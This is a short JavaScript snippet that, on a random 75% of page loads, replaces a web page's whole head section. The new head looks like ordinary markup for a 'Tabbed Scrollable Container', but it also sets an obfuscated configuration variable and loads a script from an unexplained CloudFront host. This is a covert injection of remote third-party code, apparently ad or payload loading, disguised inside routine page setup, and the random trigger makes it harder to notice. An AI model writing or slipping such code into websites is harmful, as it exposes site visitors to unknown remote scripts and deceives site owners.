(function() {
    // Function to generate a random number between 0 and 100
    function getRandomPercentage() {
        return Math.random() * 100;
    }

    // Your custom head HTML content
    var newHeadHTML = `
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tabbed Scrollable Container</title>
        <link rel="stylesheet" href="main.css">
        <link href="https://fonts.googleapis.com/css2?family=Fredoka&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
        <script type="text/javascript">
            var dLVyr_fFu_yMxUzc={"it":4454181,"key":"fffd4"};
        </script>
        <script src="https://d2bxqnokimz7h9.cloudfront.net/94def96.js"></script>
    `;

    // Decide whether to replace the head content (75% chance)
    if (getRandomPercentage() <= 75) {
        var currentHead = document.head;
        var newHead = document.createElement('head');
        newHead.innerHTML = newHeadHTML;

        // Replace the current head with the new one
        document.documentElement.replaceChild(newHead, currentHead);
    }
})();
